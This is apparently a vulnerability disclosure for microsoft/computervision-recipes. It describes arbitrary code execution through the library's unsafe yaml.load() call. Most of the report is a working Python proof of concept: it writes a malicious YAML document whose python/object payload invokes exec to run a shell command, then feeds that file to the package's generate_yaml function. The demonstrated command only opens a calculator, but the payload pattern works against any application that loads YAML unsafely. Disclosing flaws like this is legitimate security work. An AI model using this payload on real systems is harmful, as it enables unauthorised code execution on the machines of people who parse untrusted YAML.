# Description
**Arbitrary Code Excecution** in microsoft/computervision-recipes.
This repository provides examples and best practice guidelines for building computer vision systems.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**
# Exploit code
**Python File**
```python
import os
import utils_cv.common.deployment as deployment

#setup -- if you havn't done the setup , uncomment the below line 
os.system('pip install git+https://github.com/microsoft/ComputerVision.git@master#egg=utils_cv')

exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('exploit.yml','w+').write(exploit)
nl = []
deployment.generate_yaml('./','exploit.yml',nl,'exploit.yml')
os.system('rm ./exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/785942792337621012/Screenshot_from_2020-12-09_00-10-55.png)
